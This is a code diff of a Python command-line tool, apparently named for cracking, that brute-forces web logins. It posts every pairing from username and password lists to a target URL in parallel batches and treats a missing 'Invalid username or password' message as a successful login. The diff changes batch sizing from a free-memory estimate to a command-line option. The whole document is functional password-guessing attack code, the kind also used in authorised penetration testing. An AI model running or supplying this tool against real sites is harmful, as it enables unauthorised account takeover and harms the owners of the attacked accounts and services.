@@ -12,14 +12,9 @@ import asyncio
 from functools import wraps
 import logging
 import timeit
-import psutil
 from typing import Generator
 
 logger = logging.getLogger(logging.basicConfig(level=logging.DEBUG))
-
-MEM_USAGE = 0.8
-MEMORY = psutil.virtual_memory().free * MEM_USAGE
-logger.info("Using %s of free memory (%s bytes)", MEM_USAGE, MEMORY)
 
 
 def coroutine(f):
@@ -35,21 +30,21 @@ def coroutine(f):
 @click.option("-p", "password", type=str, help="Single known password")
 @click.option("-U", "user_list", type=Path, help="List of users to try")
 @click.option("-P", "password_list", type=Path, help="List of passwords to try")
+@click.option("-b", "batch_size", type=int, help="Number of parallel requests")
 @click.option("-t", "threads", type=int, default=8)
 @coroutine
-async def crack(url:str, user:str, password:str, user_list:Path, password_list:Path, threads:int):
+async def crack(url:str, user:str, password:str, user_list:Path, password_list:Path, batch_size:int, threads:int):
     _check_inputs(url, user, password, user_list, password_list)
     users = user_list.read_text("latin-1").splitlines() if user_list else [user]
     passwords = password_list.read_text("latin-1").splitlines() if password_list else [password]
     myconn = aiohttp.TCPConnector(limit=10)
     async with ClientSession(connector=myconn) as session:
-        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(users, passwords)), MEMORY):
+        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(users, passwords)), batch_size):
             results = await asyncio.gather(*batch, return_exceptions=True)
             for result in results:
                 if isinstance(result, Exception):
                     raise result
-                if result:
-                    sys.exit(0)
+                    
 
 def _check_inputs(url, user, password, user_list, password_list):
     if user and user_list:
@@ -59,16 +54,8 @@ def _check_inputs(url, user, password, user_list, password_list):
     if not "http" in url:
         raise ValueError("Your url must specify an http ressource")
 
-async def batched_tasks(genexpr:Generator, memory):
+async def batched_tasks(genexpr:Generator, batch_size):
     batch = []
-    try:
-        probe_element = next(genexpr)
-    except StopIteration:
-        yield batch
-        return
-    batch = [probe_element]
-    batch_size = int(memory / sys.getsizeof(probe_element))
-    logger.info("Using batch size of %s", batch_size)
     while True:
         for _ in range(batch_size):
             try:
@@ -91,9 +78,8 @@ async def post_and_check(url, data, session:ClientSession) -> bool:
         result = await response.text()
         if "Invalid username or password" not in result:
             logger.info("Successful login for %s", data)
-            return True
+            sys.exit(0)
         logger.debug("Unsuccessful login for %s", data)
-        return False
     
 
 if __name__ == "__main__":
